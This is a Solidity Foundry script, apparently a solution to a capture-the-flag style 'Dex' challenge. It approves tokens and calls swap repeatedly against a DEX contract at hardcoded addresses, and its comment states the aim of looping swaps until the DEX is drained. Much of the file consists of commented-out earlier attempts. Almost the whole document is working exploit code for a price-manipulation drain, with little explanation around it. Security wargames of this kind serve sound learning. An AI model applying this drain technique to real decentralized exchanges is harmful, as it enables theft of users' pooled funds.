pragma solidity ^0.8.0;

import "forge-std/Script.sol";
contract DexScript is Script {

    /**
     * First, feed the dex contract 10 token and loop swap until dex getes drained :)
     * some math could've been done but we love iterative swaps  :)
     */
    function run() external {
        vm.startBroadcast();
        address instance = 0x6C920469514a62Ca39F100c73CB27425eEDd2CC8;
        address token1 = 0xF0d5231842Ad6aB74436D9300fbd388261C4b44A;
        address token2 = 0x6510a367BA59ae58D438DEbe39009Fa054EA2284;
        uint256 a = 10;
        // (bool suc, ) = instance.call{value: 0}(abi.encodeWithSignature("approve(address,uint256)", instance, a));
        // if (suc) {
        //     console.log("approved success");
        // }else {
        //     console.log("approved fail");
        // }
        // ( suc, ) = token1.call{value: 0}(abi.encodeWithSignature("transfer(address,uint256)", instance, a));

        // if (suc) {
        //     console.log("send instance 10 token1");
        // }else {
        //     console.log("2 failed");
        // }

        // (suc, ) = instance.call{value: 0}(abi.encodeWithSignature("swap(address,address,uint256)", token2, token1, 10));
        // if (suc) {
        //     console.log("1 attack success");
        // } else {
        //     console.log("attack failed");
        // }

        // for (uint i = 0; i < 5; i++) {
            ( bool suc, ) = instance.call{value: 0}(abi.encodeWithSignature("approve(address,uint256)", instance, 70));
        if (suc) {
            console.log("approved success");
        }else {
            console.log("approved fail");
        }

            instance.call{value: 0}(abi.encodeWithSignature("swap(address,address,uint256)", token2, token1, 40));
            // instance.call{value: 0}(abi.encodeWithSignature("swap(address,address,uint256)", token2, token1, 10));
        // }

    }
}